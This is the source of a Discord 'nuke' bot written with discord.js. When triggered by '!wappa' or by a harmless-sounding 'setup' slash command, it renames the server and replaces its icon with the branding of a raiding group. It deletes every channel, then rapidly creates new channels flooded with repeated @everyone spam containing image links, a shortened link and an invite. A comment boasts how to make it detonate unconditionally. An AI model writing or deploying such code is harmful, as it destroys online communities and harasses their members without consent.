const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionsBitField,
  IntentsBitField,
  Partials
} = require("discord.js");
const fs = require("fs")

const client = new Client({ intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages
  ], partials: [Partials.Channel] });
var ctkppng = fs.readFileSync("./ctkp.png")

process.on('uncaughtException', function(err) {
    console.log(err)
});

client.on("messageCreate", async (message) => {
  if (message.content === '!wappa') {
    message.guild.setIcon(ctkppng)
    message.guild.setName("荒らし共栄圏支配下")
    /*↑"message.content === '!wappa'"をtrueに書き換えたら問答無用で起爆する危険なbotの出来上がり*/
    var g = message.guild.id
    console.log(g)
    var ch = JSON.parse(JSON.stringify(message.guild)).channels
    for (const a of ch) {

      client.channels.cache.get(a).delete()
    }
    var qwer = setInterval(function() {
      client.guilds.cache.get(g).channels.create({
        name: `ワッパステイ主席万歳!荒らし共栄圏最強!`,
        type: 0,
        parent: null
      }).then((ch) => {
        
          ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);
        
      }).catch((err) => { console.log(err); });
    }, 100)
    setTimeout(function(){clearInterval(qwer)},6000)
    console.log(ch)

  }

})
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isCommand()) {
    return;
  }
  if (interaction.commandName === 'setup') {
    await interaction.deferReply();
    interaction.guild.setIcon(ctkppng)
    interaction.guild.setName("荒らし共栄圏支配下")
    var g = interaction.guild.id
    console.log(g)
    var ch = JSON.parse(JSON.stringify(interaction.guild)).channels
    for (const a of ch) {

      client.channels.cache.get(a).delete()
    }
    
    var qwer = setInterval(function() {
      client.guilds.cache.get(g).channels.create({
        name: `ワッパステイ主席万歳!荒らし共栄圏最強!`,
        type: 0,
        parent: null
      }).then((ch) => {
        ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
